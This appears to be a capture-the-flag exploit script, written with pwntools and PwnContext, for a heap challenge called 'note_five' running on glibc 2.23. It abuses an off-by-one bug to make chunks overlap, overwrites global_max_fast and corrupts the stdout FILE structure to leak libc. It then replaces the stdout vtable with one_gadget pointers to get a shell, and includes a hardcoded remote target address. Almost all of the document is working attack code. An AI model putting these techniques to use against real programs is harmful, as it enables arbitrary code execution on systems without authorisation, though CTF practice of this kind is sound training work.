#-*- coding:utf-8 -*-
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

#context.terminal = ['xterm', 'splitw', '-v'] # uncomment this if you use tmux
# functions for quick script
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))

debugg = 1
logg = 0
ctx.binary = './note_five'
elf=ELF('./note_five')
libc = ELF('./libc-2.23.so')
#ctx.custom_lib_dir = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/'#remote libc
#ctx.custom_lib_dir = '../libc-2.23.so'
#ctx.debug_remote_libc = True

ctx.symbols = {'lst':0x202080}
ctx.breakpoints = [0xf1b]

#ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
if debugg:
    rs()
else:
    ctx.remote = ('154.8.174.214', 10000)
    rs('remote')

if logg:
    context.log_level='debug'
def add(idx,sz):#off by one
    sla('choice>> ',1)
    sla('idx: ',idx)
    sla('size: ',sz)
def edit(idx,c):
    sla('choice>> ',2)
    sla('idx: ',idx)
    sa('content: ',c)
def free(idx):
    sla('choice>> ',3)
    sla('idx: ',idx)     

add(0,0x108)
add(1,0x400)
add(2,0x108)
add(3,0x108)
for i in range(4):
    add(4,0x400)
add(4,0xb0)
add(4,0x400)
edit(4,(p64(0)+p64(0x21))*40+'\n')

edit(1,'\x00'*0x3f0+p64(0x400)+'\n')
free(1)
edit(0,'\x00'*0x109)

add(1,0x108)
add(4,0x2e8)

free(1)
free(2)

add(1,0x118)
add(2,0x98)
add(3,0x358)
free(1)
edit(2,'\x00'*0x90+p64(0x1c0)+'\x60')
free(3)

add(1,0x118)
add(3,0x98)

global_max_fast = 0x87f8
write_base_offset = 0x1651
stdout_vtable_offset = 0x17c1
dbg()
ipy()#global_max_fast
payload = p64(0)+p64(write_base_offset)#free size change _IO_write_base
payload = payload.ljust(0xa0,'\x00')
payload += p64(0)+p64(0x361)
payload += p64(0)+p16(global_max_fast-0x10)
edit(4,payload+'\n')
add(0,0x358)
context.log_level='debug'
free(2)
sl(2)
sl(4)
sl(p64(0)+p64(write_base_offset-0x20))#change _IO_read_end

sl(3)
sl(3)
data = ru('\x7f',drop=False)
libc_base = uu64(data[-6:])
ru('exit')
libc_base -= 0x3c56a3
log.success("libc_base = %s"%hex(libc_base))
one = libc_base + 0xf1147
edit(0,p64(one)*8+'\n') #fake table+0x38

edit(4,'\x00'*0xa8+p64(stdout_vtable_offset)+'\n')#change vtable
free(0)
irt()
